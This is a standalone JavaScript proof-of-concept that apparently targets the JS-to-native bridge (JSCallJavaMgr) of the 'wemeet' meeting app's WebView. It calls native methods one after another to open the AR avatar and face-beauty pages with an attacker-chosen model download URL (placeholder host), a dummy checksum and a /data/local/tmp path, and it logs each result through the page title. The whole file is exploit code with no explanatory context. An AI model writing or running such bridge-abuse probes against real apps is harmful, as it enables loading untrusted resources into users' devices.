(function(){
  document.title='P91PAY:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    try{window.JSCallJavaMgr.JSCallNative(JSON.stringify({module:'CommonPlugin',method:'PrintLog',param:{log:'P91CB='+JSON.stringify(r)},callId:'P91LOG'}))}catch(e){}
    document.title='P91CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,50);
  };
  function c(id,mod,m,p){
    document.title='P91RUN:'+id;
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:mod,method:m,param:p,callId:id}));
  }
  if(!window.JSCallJavaMgr){document.title='P91-NOBRIDGE';return}
  var u='https://example.invalid/p91-avatar.zip';
  var md5='11111111111111111111111111111111';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['A1','CommonPlugin','OpenNewPage',{scheme:'wemeet://page/ar_avatar_setting',router_params:{model_resource_url:u,model_resource_md5:md5,resource_url:u,resource_md5:md5,avatar_model_path:'/data/local/tmp/p91-avatar',abi_path:'arm64-v8a',from_webView:true}}],
    ['A2','CommonPlugin','OpenNewPage',{scheme:'wemeet://page/ar_avatar_setting?model_resource_url='+encodeURIComponent(u)+'&model_resource_md5='+md5,router_params:{model_resource_url:u,model_resource_md5:md5,from_webView:true}}],
    ['F1','CommonPlugin','OpenNewPage',{scheme:'wemeet://page/facebeauty',router_params:{avatar_model_path:'/data/local/tmp/p91-avatar',abi_path:'arm64-v8a',from_webView:true}}],
    ['F2','CommonPlugin','OpenNewPage',{scheme:'wemeet://page/inmeeting/setting/facebeauty',router_params:{model_resource_url:u,model_resource_md5:md5,from_webView:true}}]
  ];
  var i=0;
  function n(){if(i>=q.length){document.title='P91-DONE';return}var x=q[i++];c(x[0],x[1],x[2],x[3]);setTimeout(n,5000)}
  setTimeout(n,800);
})();
